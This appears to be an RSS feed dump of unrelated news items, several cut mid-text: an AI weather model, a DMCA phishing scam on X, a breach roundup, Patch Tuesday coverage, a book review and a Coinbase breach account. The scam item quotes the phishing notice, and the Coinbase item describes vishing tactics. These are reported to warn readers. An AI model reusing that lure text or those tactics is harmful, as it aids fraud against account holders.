Overall, WeatherNext 2 surpasses our previous state-of-the-art WeatherNext model on 99.9% of variables (e.g. temperature, wind, humidity) and lead times (0-15 days), enabling more useful and accurate forecasts.This improved performance is enabled by a new AI modelling approach called a Functional Generative Network (FGN), which injects ‘noise’ directly into the model architecture so the forecasts it generates remain physically realistic and interconnected.This approach is particularly useful for predicting what meteorologists refer to as “marginals” and “joints.” Marginals are individual, standalone weather elements: the precise temperature at a specific location, the wind speed at a certain altitude or the humidity. What's novel about our approach is that the model is only trained on these marginals. Yet, from that training, it learns to skillfully forecast 'joints' — large, complex, interconnected systems that depend on how all those individual pieces fit together.

DMCA (Digital Millennium Copyright Act) notices are legal requests about copyrighted content, so it makes sense that many users would worry they broke the rules and feel eager to read the warning.“Some recent activity on your page may not fully meet our community standards. Please take a moment to review the information below and ensure your shared content follow our usage rules.Notice Date : {day received}”Kindly review the material You’ve shared.If you think this notice was sent in error, you can request a check using the link below.If no update is received within 24 hours, your page visibility may stay temporarily limited until the review is complete.We thank you for your attention and cooperation in keeping this space respectful and positive for all.”As usual, the scammers add some extra pressure by claiming your account may be hidden or limited if you don’t act within 24 hours.But the “Review Details” button doesn’t lead to anything on X.

There are new confirmed breaches at The Washington Post, Logitech, Allianz UK, and GlobalLogic, as well as a newly listed but unconfirmed breach involving the British National Health Service (NHS). The group has leaked data sets ranging from gigabytes to terabytes and is sending extortion emails to Oracle EBS customers. Oracle has issued emergency patches, but investigations indicate exploitation began months before disclosure.Check Point IPS provides protection against this threat (Oracle Concurrent Processing Remote Code Execution)Payment processor Checkout.com has discloseda data breach by the ShinyHunters threat group. Attackers accessed documents from a legacy cloud storage system that wasn’t properly decommissioned, potentially affecting about 25% of current merchants. That being said, no payment card numbers or funds were compromised. The company is notifying impacted parties and regulators.DoorDash, a food delivery company, has confirmeda data breach after an employee fell victim to a social engineering scam. Contact details including names, physical addresses, email addresses, and phone numbers were accessed across the US, Canada, Australia, and New Zealand.Ransomware group dubbed “J Group” claims to have breached Australian engineering firm IKAD. The group has reportedly exfiltrated 800GB of data by exploiting a VPN flaw and maintaining undetected access for five months. IKAD confirmed a cyber incident and the theft of non-sensitive contract and HR information, while denying exposure of classified defence data.Pro-Russian group NoName057(16) launched DDoS attacks disrupting Danish government, municipal, and defense-related websites, including the Ministry of Transport, Borger.dk, and Terma. The outages were brief with no data loss, and the activity aligns with wider pro-Russia targeting of European institutions.Port Alliance, a Russian port operator handling coal and fertilizer exports, has reportedthree days of cyberattacks combining DDoS and attempted network intrusions. Terminals remain operational, but digital services were disrupted by a botnet of more than 15,000 rotated IP addresses. The goal of the attack was to destabilize operations and disrupt business processes.Princeton University disclosed a breach of its Advancement database on November 10, lasting less than 24 hours before attackers were removed. The compromised database contained names, contact information, and fundraising records for alumni, donors, faculty, students, and parents, but did not include Social Security numbers, passwords, or financial information.VULNERABILITIES AND PATCHESMicrosoft’s October Patch Tuesday Microsoft addressed63 vulnerabilities, including an actively exploited Windows zero-day, CVE-2025-62215, a kernel privilege escalation flaw used to gain admin access.

"Is curing patients a sustainable business model?" analysts ask in an April 10 report entitled "The Genome Revolution.""The potential to deliver 'one shot cures' is one of the most attractive aspects of gene therapy, genetically-engineered cell therapy and gene editing. However, such treatments offer a very different outlook with regard to recurring revenue versus chronic therapies," analyst Salveen Richter wrote in the note to clients Tuesday. "While this proposition carries tremendous value for patients and society, it could represent a challenge for genome medicine developers looking for sustained cash flow."Richter cited  treatments for hepatitis C, which achieved cure rates of more than 90 percent. The company's U.S. sales for these hepatitis C treatments peaked at $12.5 billion in 2015, but have been falling ever since. Goldman estimates the U.S. sales for these treatments will be less than $4 billion this year, according to a table in the report."GILD is a case in point, where the success of its hepatitis C franchise has gradually exhausted the available pool of treatable patients," the analyst wrote. "In the case of infectious diseases such as hepatitis C, curing existing patients also decreases the number of carriers able to transmit the virus to new patients, thus the incident pool also declines … Where an incident pool remains stable (eg, in cancer) the potential for a cure poses less risk to the sustainability of a franchise."The analyst didn't immediately respond to a request for comment.The report suggested three potential solutions for biotech firms:"Solution 1: Address large markets: Hemophilia is a $9-10bn WW market (hemophilia A, B), growing at ~6-7% annually." "Solution 2: Address disorders with high incidence: Spinal muscular atrophy (SMA) affects the cells (neurons) in the spinal cord, impacting the ability to walk, eat, or breathe.""Solution 3: Constant innovation and portfolio expansion: There are hundreds of inherited retinal diseases (genetics forms of blindness) … Pace of innovation will also play a role as future programs can offset the declining revenue trajectory of prior assets."]]></content:encoded></item><item><title>Microsoft Patch Tuesday, November 2025 Edition</title><link>https://krebsonsecurity.com/2025/11/microsoft-patch-tuesday-november-2025-edition/</link><author></author><category>security</category><pubDate>Sun, 16 Nov 2025 21:47:14 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Microsoft also fixed a glitch that prevented some  users from taking advantage of an extra year of security updates, which is nice because the zero-day flaw and other critical weaknesses affect all versions of Windows, including Windows 10.Affected products this month include the Windows OS, , , , , , and . The zero-day threat concerns a memory corruption bug deep in the Windows innards called CVE-2025-62215. Despite the flaw’s zero-day status, Microsoft has assigned it an “important” rating rather than critical, because exploiting it requires an attacker to already have access to the target’s device.“These types of vulnerabilities are often exploited as part of a more complex attack chain,” said , dean of research for the SANS Technology Institute. “However, exploiting this specific vulnerability is likely to be relatively straightforward, given the existence of prior similar vulnerabilities.”, lead cybersecurity engineer at , called attention to CVE-2025-60274, a critical weakness in a core Windows graphic component (GDI+) that is used by a massive number of applications, including Microsoft Office, web servers processing images, and countless third-party applications.“The patch for this should be an organization’s highest priority,” McCarthy said. “While Microsoft assesses this as ‘Exploitation Less Likely,’ a 9.8-rated flaw in a ubiquitous library like GDI+ is a critical risk.”Microsoft patched a critical bug in  — CVE-2025-62199 — that can lead to remote code execution on a Windows system. , CEO and co-founder of , said this Office flaw is a high priority because it is low complexity, needs no privileges, and can be exploited just by viewing a booby-trapped message in the Preview Pane.Many of the more concerning bugs addressed by Microsoft this month affect Windows 10, an operating system that Microsoft officially ceased supporting with patches last month. As that deadline rolled around, however, Microsoft began offering Windows 10 users an extra year of free updates, so long as they register their PC to an active Microsoft account.Judging from the comments on last month’s Patch Tuesday post, that registration worked for a lot of Windows 10 users, but some readers reported the option for an extra year of updates was never offered. , cyber incident response manager at , notes that Microsoft has recently released an out-of-band update to address issues when trying to enroll in the Windows 10 Consumer Extended Security Update program.“If you plan to participate in the program, make sure you update and install KB5071959 to address the enrollment issues,” Carroll said. “After that is installed, users should be able to install other updates such as today’s KB5068781 which is the latest update to Windows 10.” at notes that in addition to Microsoft updates today, third-party updates from  and  have already been released. Also, an update for  is expected soon, which means  will also be in need of its own update.The SANS Internet Storm Center has a clickable breakdown of each individual fix from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on any updates gone awry.As always, please don’t neglect to back up your data (if not your entire system) at regular intervals, and feel free to sound off in the comments if you experience problems installing any of these fixes.[Author’s note: This post was intended to appear on the homepage on Tuesday, Nov. 11.

The book gave me invaluable advice as I started out in my career as a professional software engineer. Re-reading it a decade later, I thought the general advice still held up well, but it made references to technologies such as CORBA that are no longer used and felt dated as a result. The authors agreed and wrote a 20th anniversary edition that was updated for modern developers. A third of the book is brand-new material, covering subjects such as security and concurrency. The rest of the book has been extensively rewritten based on the authors’ experience putting these principles into practice. We discussed the 20th anniversary edition in my book club at work. The book is meant for those just starting out in the world of professional software engineering. Many of the tips, such as Tip 28: Always Use Version Control will seem obvious to experienced hands. However, it can also be a guide for senior developers mentoring junior developers, putting actionable advice into words. The book is also valuable to those who lack a formal CS education; it explains things like big-O notation and where to learn more about these subjects. I think that any software engineer will get one or two things out of this book, though it’s most valuable for beginners.One of the things I appreciate about the book is that they talk about applying the principles not only to software engineering but to writing the book as well. The book was originally written in troff and later converted to LaTeX. For example, to illustrate Tip 29: Write Code That Writes Code they wrote a program to convert troff markup to LaTeX. In the 20th anniversary edition, they talk about their efforts to use parallelism to speed up the book build process and how it led to surprising bugs.Perhaps the best thing about the book is that the authors summarize their points into short tips highlighted throughout the book. The authors helpfully attach these tips to a card attached to the physical book. This makes it easy to remember the principles espoused in the book and to refer to them later. I think this is a feature that more books should include, especially managerial or technical books.Chapter 1: A Pragmatic PhilosophyThe first chapter is less about coding and more about the general principles a pragmatic programmer follows. Most of all, it’s about taking responsibility for your work. The first tip of the chapter is : if you don’t like something, you can be a catalyst for change. Or you can change organizations if change isn’t happening. The most important tip of the chapter to me is Tip 4: Provide Options, Don’t Make Lame Excuses. In this section, they discuss taking responsibility for the commitments you make and having a contingency plan for things outside your control. If you don’t meet the commitment, provide solutions to fix the problems. Don’t tell your boss, “The cat ate my source code.”Software rots over time without efforts to fix it. The authors talk about broken windows policing, the theory that minor problems such as a single broken window give people the psychological safety to commit larger crimes. Regardless of whether broken windows policing is actually true, the metaphor applies to software. This leads to Tip 5: Don’t Live with Broken Windows: If you see a broken window in your software, make an effort to fix it, even if it’s only a minor effort to board it up. This may seem impractical if your project already has a lot of broken windows, but this tip helps you avoid creating such an environment in the first place. In my experience, it works: when we set up a new project at work, we made a commitment to use git commit hooks to enforce coding standards. This made each of us more reluctant to compromise on software to begin with, and all of the code was a good example to copy from.A pragmatic programmer is always learning, and learns things outside their specialty; they are a jack of all trades. Even if they are a specialist in their current role, they invest regularly in a broad knowledge portfolio. In addition to software skills, people skills are important as well. The section “Communicate!” shows how to effectively communicate your ideas, such as how to present, what to say, and how pick the right time. In the words of Tip 11: English is Just Another Programming Language. If you don’t have an answer to an email immediately, respond with an acknowledgment and that you’ll get back to them later - nobody wants to be talking to a void. Don’t be afraid to reach out for help if you need it; that’s what your colleagues are there for, after all. And don’t neglect documentation! Make it an integral part of the development process, not an afterthought.Finally, the principles in this book are not iron-clad: you must consider the tradeoffs between different values and make the right decision for your project. Your software does not need to be perfect. When working on software, involve your users in deciding what quality issues are acceptable in return for getting it out faster. After all, if you wait a year to ship the perfect version, their requirements will change anyways. As Tip 8 says: Make Quality a Requirements Issue.Chapter 2: A Pragmatic ApproachWhy is decoupling good? Because by isolating concerns we make each easier to change. ETC.
Why is the single responsibility principle useful? Because a change in requirements is mirrored by a change in just one module. ETC.
Why is naming important? Because good names make code easier to read, and you have to read it to change it. ETC! However, the authors also stress that ETC is a , not a . For example, ETC may not be appropriate for writing code that has high performance requirements; making the code complex to achieve the performance requirements is an acceptable tradeoff. They then turn to another important acronym for implementing ETC in Tip 15: DRY—Don’t Repeat Yourself. DRY makes things easier to change by having one place to change anything. Worse, if you forget to make a change, you’ll have contradictory information in your program that could crash it or silently corrupt data.What kind of duplication is there?: For example, having a case statement duplicated across several different places rather than in a single function.Documentation Duplication: Some people believe that every function needs a comment. If you do this, you will also have to update the comments each time the function changes. Ask what your comment adds to the code before writing it!: Caching an expensive result and forgetting to update the cache when the source data changes.Representational Duplication: When you work with external API, the client and server must adhere to the same format in order to work. If one changes, the other side will break Having a common specification, such as openAPI allows you to integrate more reliably with the service.Interdeveloper duplication: When two developers do the same work. This can be mitigated by Tip 16: Make It Easy to Reuse. If it’s hard to use your code, other developers will be tempted to duplicate it.A closely related principle to DRY is . Two components of a software system are orthogonal if changes in one do not effect the other. Systems should be designed as a set of cooperating independent modules, each of which has a single, well-defined purpose. Modules communicate between themselves using well defined interfaces and don’t rely on shared global data or the implementation details of another module. Unless you change a component’s external interfaces, it should not cause changes in the rest of the system. Orthogonal systems are easier to test, because more testing can be done at the module level in unit tests rather than end-to-end integration tests that test the whole system.Often, when starting a software project, there are a lot of unknowns. The user has an idea of what they want, but there’s some ambiguity in the requirements. You don’t know if the library and frameworks you pick will work nicely together. The solution here is Tip 20: Use Tracer Bullets to Find the Target. In a machine gun, tracer bullets are bullets that glow in the air, enabling the user to see if they’re hitting the target at night. Tracer Bullet Development provides that kind of immediate feedback. Look for a single feature that can be built quickly using the architectural approach you’ve chosen, and put that in front of the users. You may miss; users may say that’s not quite what they wanted. But that’s the point of tracer code: it allows you to adjust your aim with a skeleton project that’s easier to change than a final application. Users will be delighted to see something working early, and you’ll have an integration platform to build the rest of the application on.Tracer code is different from prototypes. To the authors, prototypes are disposable code used to learn about a problem domain, never meant to be used in production. Prototypes don’t even have to be code. A UI can be mocked up in an interface builder, or an architecture mapped out with post-it notes. In terms of Tip 21: Prototype to Learn. In contrast, tracer bullet code is meant to be part of the final application.The final tip of this chapter I bring up is Tip 18: There Are No Final Decisions. Decisions should be reversible; if you rely on MySQL today, you may find yourself needing to switch to Postgres six months from now. If you’ve properly abstracted the database logic, making this change should be easy. Marketing may decide that your web app should be a mobile app in the future; if your architecture is built well, this extra demand should not be a burden. This is one tip I disagree with: I think it can easily be taken too far. If you provide too much reversibility, you’ll end up with over-abstracted code with configuration options that are never used. I think it’s more reasonable to think about what decisions can reasonably change and make them flexible; if you spend all your time trying to cover for every possibility, you’ll never get around to actually coding the required functionality.This chapter focuses on how to make the most out of your tools, what tools to invest in, and how to approach debugging. The first bit of advice: Tip 25: Keep Knowledge in Plain Text. By plain text, they mean keep knowledge such as configuration or data in a simultaneously human-readable and computer readable format. Plain text insures you against obsolesce; you can always write something to parse it later, while reverse-engineering a binary format is significantly harder. In addition, almost any other tool in existence can process plain text in some way, so you’ll have an extensive suite of other tools to use. As an extension of the power of plain text, they also suggest you master a command shell such as . Shells provide a family of tools that are composable with each other, and can be combined as much as your imagination allows. A GUI in contrast, limits you to the actions the programmers of the GUI thought of in advance. Finally, you should learn a text processing language such as  or  to get the most out of text - the authors used perl (first edition) and ruby (20th anniversary edition) to automatically highlight the source code in the book, for example.The next topic the authors turn to is debugging. Debugging is the main task a software engineer does throughout their day, so it’s essential you get good at it. Defects show up in a variety of ways, from misunderstood requirements to coding errors. Some cultures try to find someone to blame for a defect; the authors think you should avoid that with Tip 29: Fix the Problem, Not the Blame.They give the following tips on debugging your code:: It’s easy to panic when you’re on a tight deadline or a client is angry at you. However, take a deep breath and think about the problem at hand. The cause of the bug may be several layers removed from what you’re seeing, so try to focus on root causes rather than fixing the symptoms.The Impossible has Happened: If you think to yourself “that’s not possible” - you’re wrong. It’s clearly possible, and it’s staring you in the face.: Find a minimal case that triggers the bug, whether that be a certain input data set, or pattern of actions. Once you can reliably cause the bug, you can trace it through your code.Tip 32: Read the Damn Error Message: Enough said.The Operating System is Fine: It’s  that you found a bug in the Linux kernel or postgres, but these are extensively battle-tested applications. It’s much more likely that the problem is in your code.: Cut things in half until you find the problem. This massively decreases the search space you have to work in. If you have a long stack trace and are trying to find which function mangled the value, log the value halfway through. If the value is fine, log the value halfway through the next half, or if it’s mangled, halfway through the previous half, and so on. If a release introduces a regression, find a version that’s fine, and binary chop through the commits to find the commit that introduced the bug.Use a Debugger and/or Logging Statements: Debuggers allow you to step through the code and inspect the values of variables, finding the exact point where things go wrong. In environments where a debugger is not available, logging statements can show you how a variable changes in time, or just how far the program got before crashing.: Explain the bug to a colleague, or talk out loud to a rubber duck. You don’t have to get a response, by verbalizing your assumptions you may gain sudden insight into the problem.Once you’ve solved the bug, however there’s still one more step: you should write a test to catch that bug in the future.Chapter 4: Pragmatic ParanoiaTip 36: You Can’t Write Perfect Software starts off the chapter. While we’d like to write perfect software, there will always be bugs, poor design decisions, and missing documentation. The theme of this chapter is how to design this fact in mind.The first idea they propose is . Similar to legal contracts, it explains a function or module’s rights and responsibilities. A contract has three parts: It has : things that must be true when it is called, such as what qualifies as valid inputs.  are what will be true when it is done, such as a sort routine returning a sorted array. Finally,  are things that are always true from the caller’s perspective - they may change while the routine is running, but will hold at the beginning and the end of the call. For example, in a sort routine, the invariant is that the list to be sorted will contain the same number of items when it started as when it finished. If the contract is violated, the contract will specify what to do, such as crash or throw an exception.Some languages, such as Clojure have built-in semantics for design by contract, with explicit pre- and post- conditions. However, if your language doesn’t support contracts, you can implement them with Tip 39: Use Assertions to Prevent the Impossible. You can assert that the conditions of your contract are true, and handle the cases where the contract is violated. If you don’t know what to do when a contract is violated, the authors recommend . It’s better that you crash rather than write incorrect data to the database. After all, dead programs tell no lies. Of course, crashing immediately may not be appropriate - if you have resources open make sure to close them before exiting.The final paranoid tip is Tip 43: Avoid Fortune-Telling. Pragmatic programmers only make decisions that they can get immediate feedback on. The more predictions you make about the future, the more likely you’ll get some of the predictions wrong and make the wrong decision based on them.You might find yourself slipping into fortune telling when you have to:Estimate completion dates months in the futurePlan a design for future maintenance or extendabilityGuess user’s future needsGuess future tech availabilityChapter 5: Bend, or BreakIn a previous chapter, the authors wrote about making decisions  and . This chapter tells you how to implement it in your code. The key here is to make your code flexible rather than rigid - good code bends to circumstances rather than breaks. Part of this is  code. Code is consider coupled when they share something in common. This may be something as simple as a shared global variable, or something more complex like an inheritance chain.The authors argue against what they term  - long chains of method calls, such as this example they give:public void applyDiscount(customer, order_id, discount) { 
	totals = customer
			  .orders 
			  .find(order_id) 
			  .getTotals();

	totals.grandTotal = totals.grandTotal - discount;
	totals.discount = discount; 
}

This code is traversing many different levels of abstraction - you have to know that a customer object exposes orders, that orders have a  method, and that the order  returns has a  method. If any of these levels of abstraction are changed, your code might break. And requirements may change; What if the business decides to implement a maximum discount amount of 40%? Certainly, this could be applied in the  routine, but anything could modify the  and  fields - this rule could be violated if other modules modifying the totals object don’t get the memo.The authors suggest refactoring the code so that there is no orders object, just a  method and an applyDiscount method for the order object that implements the 40% rule:public void applyDiscount(customer, order_id, discount) { 
	customer
	.findOrder(order_id)
	.applyDiscount(discount); 
}
The authors suggest having only one . when you access something if that something is likely to change, such as anything in your application, or a fast moving external API. This includes using intermediate variables between accesses, such as this code:# This is cheating!
orders = customer.orders
order = orders.find(order_id)
totals = order.getTotals
However, the rule does not apply to things that are unlikely to change, such as core language APIs. So this code is ok:people
.sort_by {|person| person.age } 
.first(10)
.map {| person | person.name }
Another source of coupling is globally accessible data. Global data makes it hard to reason about the state of a program, since any other module might be able to change it. Global data includes design patterns such as singletons, and external resources such as databases. Given how extensive global resources are, how can one avoid them? If global data is unavoidable, the key is to manage them through a well-defined API that you control, rather than allowing anything to read and write global data. In the words of Tip 48: If It’s Important Enough to Be Global, Wrap It in an API.Poor use of inheritance is a third source of coupling. Inheritance is used for two reasons: code reuse and type modeling. Inheritance doesn’t work for code reuse; Not only is the code of a child class coupled to any ancestor of the class, so is any code that uses the class. Things may unexpectedly break when an ancestor changes an API, even if you are using a subclass.Nor does inheritance work for modeling types. Class hierarchies quickly become tangled, wall covering monstrosities. Another problem is multiple inheritance. A  may be a type of , but it may be an  or . Multiple inheritance is required to model this, and many OO languages don’t support multiple inheritance. Instead of paying the inheritance tax, the authors suggest using: or  are classes that contain no code but instead contains behaviors. A class that implements an interface promises to define the behaviors. For example, a  might implement  which has methods such as  and . Interfaces can be used as types, and any class that implements the interface will be compatible with that type. This is a much easier way to provide polymorphism than inheritance.Another alternative to inheritance is . If you want to include behavior from class  add a member of type  to your class rather than inherit from . You can then use Foo’s API wrapped in code you control. Delegation is a  relationship rather than a  relationship.The problem with interfaces and delegation is that they require writing lots of boilerplate code. For example, it’s likely that most of your classes that implement  will have the same logic for , but each class will have to write it’s own implementation of . This leads to repeated code across your codebase, violating the DRY principle. To resolve this, the authors turn to  - sets of functions that can be “mixed into” a class. This allows you to add common functionality without using inheritance. I wonder how mixins are implemented in a language like Java, which doesn’t have an obvious version of that feature. It’s also not clear to me how mixins are different from inheritance; aren’t they just a form of multiple inheritance?Tip 55: Parameterize Your App Using External Configuration: Code may have values that change while the application is running, such as credentials for for third-party services. Rather than directly including the values in your code, you should externalize them and put them in a configuration bucket. Keeping credentials in source code is a security risk - hackers scan public git repositories for common security credentials, such as AWS keys. It’s common to store them in a flat file or database tables, and read them when the application initializes. However, in our world of highly-available applications that’s not as appropriate. Instead the authors propose configuration-as-a-service, where configuration is stored behind a service API. This allows multiple applications to share configuration information, use access control to control who can see and edit configuration, and provide a UI to easily edit config information. Using the configuration service, applications can subscribe to a configuration item and get notifications when they change. This allows applications to update config data on their side without restarting.This chapter deals with , where two pieces of code run at the same time, and , where things act as if they run at the same time. In the real world, things are asynchronous - the user is supplying input, network resources are called, and the screen is being redrawn all at the same time. Applications that run everything serially feel sluggish.In Tip 56: Analyze Workflow to Improve Concurrency the authors advocate that you break temporal coupling where possible.  is when your code depends on event A happening before event B. You should look at your workflow to see what can be executed concurrently. Look for activities that take a lot of time that would allow for something else to be done in the meantime. If your application makes multiple independent API calls to a remote service, execute them on separate threads rather than serially, then gather up the results of each call. If your workflow allows a way to split the work into multiple independent units, take advantage of those multiple cores and execute them in parallel.Of course, parallelism has its pitfalls as well. For example, imagine reading an integer, incrementing it, and writing it back. If two processes read that integer at the same time, they will each increment the value to n+1, when you want it to be n+2. The update needs to be atomic; each process needs to do this sequentially without the other process interfering. This can be done through synchronized methods, semaphores, or other forms of resource locking. However, they have their own dangers as well, such as deadlocking, where two processes each get a lock on one of two needed resources, but not the other. Each waits forever for the other to release its lock. The authors think you should avoid shared state rather than try to handle yourself wherever possible; Tip 57: Shared State Is Incorrect State.The authors ran into this issue when writing the 20th anniversary edition: they updated the build process for the book to utilize parallelism. However, the build would randomly fail. The authors tracked this down to changing the directory temporarily. In the original, a subtask would change directory, then go back to the original directory. However, this no longer worked when new threads started, expecting to be in the root directory. Depending on the timing, this could break the build. This prompted them to write Tip 58: Random Failures Are Often Concurrency Issues.Chapter 7: While You Are CodingThis chapter is more of a grab-bag. It covers subjects such as psychology, big-O notation, refactoring, security, and testing.In Tip 61: Listen to Your Inner Lizard the authors talk about listening to your instincts (your lizard-brain). If you find yourself having a hard time writing code, your brain is trying to tell you something. Perhaps the structure or design is wrong, or you don’t fully understand the requirements. If you find yourself in this situation, take a step back and think about what you are doing. Maybe go for a walk, or sleep on it. You might find that the solution is staring you in the face when you come back.Perhaps you need to refactor the code instead of writing more. Refactoring is a continuous process, espoused in Tip 65: Refactor Early, Refactor Often. If anything strikes you as wrong in your code, such as DRY violations, outdated knowledge or non-orthogonal design, don’t hesitate to fix it. When you are refactoring, make sure you have a good suite of unit tests beforehand to test if your changes break anything. Run the tests frequently to check if you’ve broken anything.Speaking of tests, the authors start with a bold assertion: Tip 67: Testing Is Not About Finding Bugs. Instead, tests function as the First User of Your Code - a source of immediate feedback, and immediately forces you to think about what counts as a correct solution. In addition, tightly coupled code tends to be hard to test, so it helps you make good design decisions. The authors emphatically do not think you should adopt full-on Test Driven Development - it’s too easy to become a slave to writing tests. They note an example of a TDD advocate starting a sudoku solver using TDD and spent so much time writing the tests they failed to write the solver itself!In a sidebar, Dave Thomas explains that he stopped writing tests for a few months, and said “not a lot” happened. The quality didn’t drop, nor did he introduce bugs into the code. His code was still testable, it just wasn’t tested.Andy says I shouldn’t include this sidebar. He worries it will tempt inexperienced developers not to test. Here’s my compromise:
Should you write tests? Yes. But after you’ve been doing it for 30 years, feel free to experiment a little to see where the benefit lies for you.Chapter 8: Before the ProjectThis chapter focuses on how to start your project on the right foot. The first subject the authors tackle is requirements gathering: . While we talk about gathering requirements as if they are on the ground, waiting to be picked up, requirements are non-obvious because of Tip 75: No One Knows Exactly What They Want. They think of requirements gathering as a kind of therapy, where you take an initial requirement and ask questions about the details to nail down exactly what they need. The authors show an example of a simple requirement: “Shipping should be free on all orders costing  50 or more”. Does that include the shipping cost itself? Tax? If you’re selling ebooks as well, should they be included? The job of the programmer is Tip 76: Programmers Help People Understand What They Want. You should find any edge cases the client may not have considered and make sure they’re documented. This doesn’t mean creating long specifications the client won’t read. Instead, the authors think requirements should be able to fit on an index card. This helps prevent feature creep; if the client understands how adding one more index card will impact the schedule, they’ll consider the tradeoffs and prioritize the requirements they need the most.You are given constraints in your requirements as well. Your job as a software engineer is to evaluate if those constraints are things you actually have to live with or if you can relax them. In the words of Tip 81: Don’t Think Outside the Box—Find the Box, the constraints are the edges of the box. What you initially thought of as a constraint may actually be an assumption you held.Another tip the authors advocate for is Tip 78: Work with a User to Think Like a User. If you’re building an inventory system, work in the warehouse for a few days to get an idea of their processes and how your system will be used. If you don’t understand how it will be used, you could create something that meets all of the requirements but is totally useless. They cite an example of a digital sound mixing board that could do anything to sound that was possible, yet nobody wanted to use it. Rather than take advantage of recording engineers’ experience with tactile sliders and knobs, they built an interface that was unfamiliar to them. Each feature was buried behind menus and given unintuitive names.  It did  was required, but didn’t do it  it was required. The authors also consider in this chapter what it means to be Agile. Many teams and companies are eager for an off-the-shelf solution: call it Agile-in-a-Box. But no process can make you Agile; “Use this process and you’ll be agile” ignores a key part of the Agile manifesto: Individuals and interactions over processes and tools. To the authors Agile can be boiled down to the following:Make the smallest meaningful step towards where you want to be.Evaluate where you end up, and fix anything you broke.Do this for every level of what you do, from process to code, and you’ll have adopted the Agile spirit.Chapter 9: Pragmatic ProjectsCan the lessons of  be applied to teams too? The authors say yes. This chapter focuses on how to apply the lessons of the previous chapters to the team level. Many of the lessons are the same as those mentioned previously, so I won’t go into them again.The authors advise Tip 87: Do What Works, Not What’s Fashionable. Just because Google or Facebook adopts process $ x $ doesn’t mean it’s right for your team. How do you know if something works? Try it. Pilot an idea with a small team, and see what works about it and what doesn’t. The goal isn’t to “do Scrum” or “be Agile”, but to deliver working software continuously. When you adopt a new idea, you should do it with improving continuous deployment of software in mind. If you’re measuring your deployments in months, try to get it down to weeks instead. Once you get it down to weeks, try to deliver in one-week iterations.Related to continuously delivering software is Tip 96: Delight Users, Don’t Just Deliver Code. Delivering working software in a timely matter is not enough to delight your users; that is merely meeting expectations. The authors suggest you ask your users a question:How will you know that we’ve all been successful a month (or a year, or whatever) after this project is done?The answer may not be related to the requirements, and may surprise you. For example, a recommendations engine might be valued on driving customer retention. But once you know what the secret to success is, you should aim not just to hit the goal but to exceed it.Finally, take pride in your work. The final tip of the book is .I was only able to cover a portion of this remarkable book in this review. I highly recommend this book to any software engineer, especially to those just starting out in the field. It makes a great graduation gift to someone just finishing their CS degree.<< Previous ]]></content:encoded></item><item><title>I have recordings proving Coinbase knew about breach months before disclosure</title><link>https://jonathanclark.com/posts/coinbase-breach-timeline.html</link><author>jclarkcom</author><category>dev</category><pubDate>Sun, 16 Nov 2025 20:18:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[The Call That Changed EverythingOn January 7, 2025, at 5:02 PM, I received an email with a subject line that immediately caught my attention:"Order N54HJG3V: Withdrawal of 2.93 ETH initiated. A representative will be in touch shortly before we mark the payment completed"Minutes later, my phone rang. The caller ID showed 1-805-885-0141. An American-sounding woman who identified herself as a Coinbase fraud prevention representative said someone had initiated a large transfer from my account and she was calling to confirm.What happened next was chilling: She knew my social security number. She knew my Bitcoin balance down to the decimal point. She knew personal details that should have been impossible for a scammer to possess.This wasn't just another phishing attempt. This was something far more sophisticated.Timeline, With Exact DatesHere's the sequence, using exact dates: I was attacked by scammers with detailed personal information I reported the attack to Coinbase security@coinbase.comJanuary 7, 2025 (same day): Brett Farmer, Head of Trust & Safety, responded: "This report is super robust and gives us a lot to look into. We are investigating this scammer now." I asked Coinbase: "How did the attacker know the balance of my bitcoin holdings?"  I followed up again, asking for a reply  Still no answer to my critical question  I asked again: "Could I please get a response?"  Coinbase says they became aware of the breach (when attackers demanded $20M ransom) Coinbase publicly disclosed the breachFor four months, I had concrete evidence that attackers possessed detailed Coinbase customer data. For four months, I repeatedly asked Coinbase to explain how this was possible. And for four months, my questions went unanswered.Coinbase never replied to a single follow-up email after Brett Farmer's initial response. Despite his promise that they were "investigating this scammer," the most important question—how the attacker obtained my private account data—was met with complete silence.What Coinbase Disclosed in May 2025In May 2025, Coinbase finally disclosed what had happened: cybercriminals had bribed overseas customer support contractors—particularly employees at TaskUs in India—to steal sensitive customer data.The compromised information included:Names, addresses, and phone numbersLast four digits of Social Security numbersGovernment-issued ID imagesCoinbase estimated the financial impact at , affecting less than 1% of their customer base. Over 200 TaskUs employees were ultimately terminated.But here's the crucial question: If attackers were actively using stolen data to target customers in January, when did the actual breach occur? And when did Coinbase first become aware that something was wrong?What I Sent Coinbase on January 7, 2025On January 7, 2025, immediately after recognizing the attack, I sent a comprehensive security report to Coinbase's security team. This wasn't a vague complaint—it was a detailed technical analysis that should have raised immediate red flags about a data breach. Complete technical headers showing the email was routed through Amazon SES (a32-86.smtp-out.amazonses.com), not Coinbase's own mail servers, despite appearing to come from commerce@coinbase.com Documentation that while the email passed DKIM validation for both coinbase.com and amazonses.com, the actual sending infrastructure was suspiciousThe phishing email content: The complete HTML email with its fake "suspicious activity" warning and fraudulent transaction details (Order N54HJG3V, 2.93 ETH withdrawal) 1-805-885-0141 (later confirmed to be a Google Voice number) An audio recording of my second call with the scammer, capturing the entire conversation where she demonstrated knowledge of my personal informationSpecific data the attacker possessed: A detailed list of what the scammer knew, including:
                                My Social Security numberDriver's license informationThe amount of the fabricated "suspicious transfer" Description of their social engineering tactics, including the attempt to get me to move funds to "a cold wallet" by downloading Coinbase Wallet The inability of the caller to authenticate herself, the Google Voice callback number, the lack of any notifications in my actual Coinbase account Documentation that immediately after the call, I received hundreds of spam text messages for random service signups—a potential attempt to hide legitimate 2FA codes or security alerts in the noiseThis wasn't a typical phishing report. I specifically highlighted that the attacker had access to non-public account information that should have been impossible to obtain without either a device compromise on my end or a data breach at Coinbase.Brett Farmer, Coinbase's Head of Trust & Safety, responded the same day, calling it a "super robust" report. But when I followed up with the key question—"How did the attacker know the balance of my bitcoin holdings?"—the conversation ended. That critical question was never answered.Inside the Scam Email and CallHere's what made the email and call feel convincing in the moment—and what ultimately stopped me from going through with what the caller wanted.The Email: Remarkably ConvincingThe phishing email I received looked completely legitimate at first glance: Coinbase Commerce <commerce@coinbase.com> Passed validation for both coinbase.com and amazonses.com Perfect HTML layout, correct branding, legitimate-looking transaction details "We detected suspicious 